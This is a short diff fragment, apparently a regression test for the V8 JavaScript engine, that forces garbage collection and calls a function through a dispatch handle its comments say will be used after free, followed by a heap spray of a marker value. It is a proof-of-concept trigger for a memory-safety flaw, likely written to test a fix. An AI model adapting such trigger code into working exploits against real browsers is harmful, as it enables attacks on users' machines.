+gc({type: "major"});
+
+// This thing's dispatch handle will be uaf'd.
+const victim = eval("() => {}");
+
+const maglev = () => {
+  // Victim below will be called using its dispatch handle which at the time of
+  // Maglev compilation will take no args per its dispatch entry.
+  victim();
+  spray(0x424242424242n);
+};
